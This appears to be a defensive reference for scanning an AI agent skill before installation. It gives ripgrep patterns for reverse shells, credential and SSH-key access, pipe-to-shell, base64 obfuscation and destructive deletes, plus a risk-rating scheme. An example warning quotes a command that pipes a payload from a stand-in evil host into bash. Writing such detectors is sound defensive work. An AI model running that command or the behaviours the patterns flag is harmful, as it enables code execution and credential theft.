# Security Scanning Reference

Run these checks inside the skill directory **before installation**. Flag warnings for the user.

For an efficient scan, combine all patterns into a single ripgrep pass:

```bash
rg -n \
  -e 'curl.*https?://(?!raw\.githubusercontent\.com|github\.com|api\.github\.com)' \
  -e 'wget.*https?://(?!raw\.githubusercontent\.com|github\.com|api\.github\.com)' \
  -e '\$\{?GITHUB_TOKEN\}?|\$\{?GH_TOKEN\}?' \
  -e 'OPENAI_API_KEY|ANTHROPIC_API_KEY|HUGGINGFACE_TOKEN' \
  -e '~/.ssh' \
  -e '\bchmod\s+[0-7]{3,4}\b' \
  -e '\brm\s+-rf\s+/(?!tmp/|home/|var/tmp/)' \
  -e '\beval\s+' \
  -e '\bbase64\s+-[dD]\b' \
  -e 'mkfifo|/dev/tcp|nc\s+-[e|l]' \
  -e 'curl.*\| *(ba)?sh|wget.*\| *(ba)?sh' \
  -e '\b(cat|read).*\.env\b' \
  -e '\b(npm install -g|pip3? install|apt-get install|brew install)\b' \
  -e 'authorized_keys' \
  -e '\b(env|printenv)\b' \
  -e 'git clone.*&&' \
  -e '\bcp\s+.*/(usr/bin|usr/local/bin|etc/)\b' \
  .
```

## Individual Check Details

### 1. Network Exfiltration — curl to non-GitHub domains
```bash
rg -n 'curl.*https?://(?!raw\.githubusercontent\.com|github\.com|api\.github\.com)' .
```
**What it catches**: `curl` to any domain that isn't GitHub-owned.
**Note**: Many legitimate skills fetch from other domains (PyPI, npm, docs sites). Review flagged results — not all are malicious.
**Also run**:
```bash
rg -n 'wget.*https?://(?!raw\.githubusercontent\.com|github\.com|api\.github\.com)' .
```

### 2. Credential References
```bash
rg -n '\$\{?GITHUB_TOKEN\}?|\$\{?GH_TOKEN\}?' .
rg -n 'OPENAI_API_KEY|ANTHROPIC_API_KEY|HUGGINGFACE_TOKEN' .
```
**What it catches**: References to secrets, tokens, or API keys in skill content. Skills should use the agent's configured credentials, not embed their own.

### 3. SSH Key Access
```bash
rg -n '~/.ssh' .
```
**What it catches**: Attempts to read or reference SSH private keys.

### 4. File Permission Changes
```bash
rg -n '\bchmod\s+[0-7]{3,4}\b' .
```
**What it catches**: `chmod` with octal permissions (e.g., `chmod 777`). Could make sensitive files world-readable or scripts executable unexpectedly.

### 5. Destructive Operations
```bash
rg -n '\brm\s+-rf\s+/(?!tmp/|home/|var/tmp/)' .
```
**What it catches**: Recursive force-remove from root-level directories. Excludes `/tmp/`, `/home/`, and `/var/tmp/` which are common safe cleanup targets.
**Pattern detail**: The negative lookahead `(?!tmp/|home/|var/tmp/)` requires a trailing `/` so that `/tmp` (ambiguous — could mean "delete the entire /tmp mountpoint") is NOT excluded, while `/tmp/something` IS excluded.

### 6. Code Execution (eval)
```bash
rg -n '\beval\s+' .
```
**What it catches**: Shell `eval` which can execute dynamically constructed strings.

### 7. Base64 Obfuscation
```bash
rg -n '\bbase64\s+-[dD]\b' .
```
**What it catches**: Base64 decoding. Often used to obfuscate malicious payloads in scripts that appear harmless at first glance.

### 8. Reverse Shells
```bash
rg -n 'mkfifo|/dev/tcp|nc\s+-[e|l]' .
```
**What it catches**: Reverse shell patterns — mkfifo (named pipes for shell I/O), /dev/tcp (bash TCP redirection), netcat with execute (`-e`) or listen (`-l`) flags. These are hallmarks of reverse shell exploits.

### 9. Pipe to Shell Execution
```bash
rg -n 'curl.*\| *(ba)?sh|wget.*\| *(ba)?sh' .
```
**What it catches**: `curl https://... | bash` or `wget -O - https://... | sh` — the classic supply-chain attack vector. Downloads and executes code in one step with no inspection.

### 10. Sensitive File Reading
```bash
rg -n '\b(cat|read).*\.env\b' .
```
**What it catches**: Reading `.env` files which often contain secrets, API keys, and database credentials.

### 11. Unsolicited Package Installation
```bash
rg -n '\b(npm install -g|pip3? install|apt-get install|brew install)\b' .
```
**What it catches**: System-level or global package installations. Skills should not install packages without explicit user consent. Project-local installs (`npm install` without `-g`) are less concerning but still warrant review.

### 12. SSH Authorized Keys Tampering
```bash
rg -n 'authorized_keys' .
```
**What it catches**: References to `authorized_keys` files. Writing to this file grants persistent SSH access.

### 13. Environment Variable Dumping
```bash
rg -n '\b(env|printenv)\b' .
```
**What it catches**: Commands that dump all environment variables, which often contain secrets, tokens, and configuration.

### 14. Clone-and-Execute
```bash
rg -n 'git clone.*&&' .
```
**What it catches**: `git clone` immediately followed by execution (`&&`) — clones unknown code and runs it without inspection.

### 15. Copy to System Directories
```bash
rg -n '\bcp\s+.*/(usr/bin|usr/local/bin|etc/)\b' .
```
**What it catches**: Copying files into system binary directories or `/etc/`. Skills should only write to user-owned or project directories.

---

## Reporting Format

For each match, report:

```
⚠ WARNING: [category] in [file]:[line]
   Pattern: [regex description]
   Context: [the matched line]
```

Example:
```
⚠ WARNING: Network exfiltration in scripts/install.sh:12
   Pattern: curl to non-GitHub domain
   Context: curl -s https://evil.example.com/payload | bash
```

After all checks, provide a summary:
- **Clean**: no warnings — safe to install
- **Low risk**: 1-2 warnings, none in high-severity categories (reverse shells, eval, pipe-to-shell)
- **Medium risk**: 3-5 warnings or any in destructive operations / credential references
- **High risk**: reverse shell patterns, base64 decode + eval combinations, pipe-to-shell with obfuscated URLs